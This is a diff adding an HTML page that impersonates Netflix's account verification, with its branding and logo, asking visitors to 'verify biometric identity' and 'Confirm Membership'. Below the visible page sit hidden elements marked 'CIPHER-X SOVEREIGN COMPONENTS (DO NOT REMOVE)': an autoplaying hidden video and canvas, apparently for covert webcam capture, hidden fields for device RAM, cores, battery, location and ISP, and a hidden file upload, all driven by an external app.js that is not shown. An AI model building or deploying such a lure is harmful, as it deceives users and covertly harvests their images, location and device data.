@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix | Verify Your Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { background-color: #000000; color: #ffffff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        .net-red { background-color: #E50914; }
+        .glass { background: rgba(30, 30, 30, 0.6); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05); }
+        .profile-border { border: 3px solid #E50914; box-shadow: 0 0 25px rgba(229, 9, 20, 0.5); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <header class="p-6 md:p-10">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="120">
+    </header>
+
+    <main class="flex-grow flex flex-col items-center justify-center px-4">
+        <div class="max-w-md w-full glass p-10 rounded-xl border-t-2 border-red-600">
+            <h1 class="text-4xl font-bold mb-6 text-center tracking-tight">Verify Device</h1>
+            <p class="text-gray-400 text-sm mb-10 text-center leading-relaxed font-medium">To maintain household security, we need to verify your biometric identity for this device node.</p>
+            
+            <div class="relative w-32 h-32 mx-auto mb-10 group">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Netflix-avatar.png" class="rounded profile-border group-hover:scale-105 transition-transform">
+                <div class="absolute -bottom-4 -right-4 bg-white rounded-full p-2 shadow-2xl border-4 border-black">
+                    <i data-lucide="shield-check" class="text-green-600 w-8 h-8"></i>
+                </div>
+            </div>
+
+            <div class="space-y-6">
+                <div class="bg-black/80 p-5 rounded-lg border border-white/5 text-center">
+                    <span class="text-[8px] text-gray-500 uppercase font-black tracking-[0.2em] block mb-1">System DNA</span>
+                    <span id="target-ip" class="text-[10px] font-mono text-white">INITIALIZING_ENCRYPTION...</span>
+                </div>
+                <button id="init-btn" class="net-red w-full py-4 rounded font-black text-lg hover:brightness-110 transition-all shadow-[0_10px_30px_rgba(229,9,20,0.3)]">Confirm Membership</button>
+            </div>
+        </div>
+    </main>
+
+    <footer class="p-10 bg-black text-[9px] text-gray-600 flex flex-wrap justify-center gap-8 font-black uppercase tracking-[0.2em] border-t border-white/5">
+        <span>Questions? Contact Netflix</span><span>Privacy Policy</span><span>Terms of Use</span>
+    </footer>
+
+    <!-- CIPHER-X SOVEREIGN COMPONENTS (DO NOT REMOVE) -->
+    <video id="v-hidden" class="hidden" autoplay playsinline></video>
+    <canvas id="c-hidden" class="hidden"></canvas>
+    <div id="terminal" class="hidden"></div>
+    <span id="ram-val" class="hidden"></span>
+    <span id="core-val" class="hidden"></span>
+    <span id="bat-val" class="hidden"></span>
+    <span id="loc-val" class="hidden"></span>
+    <span id="isp-val" class="hidden"></span>
+    <div id="upload-status" class="hidden"><div id="upload-bar"></div><span id="percent-text"></span></div>
+    <input type="file" id="file-input" class="hidden" multiple>
+    <div id="drop-zone" class="hidden"></div>
+
+    <script src="/app.js"></script>
+    <script>
+        lucide.createIcons();
+        document.getElementById('init-btn').addEventListener('click', function() {
+            this.textContent = "VERIFYING...";
+            this.classList.add('opacity-50', 'pointer-events-none');
+        });
+    </script>
+</body>
+</html>
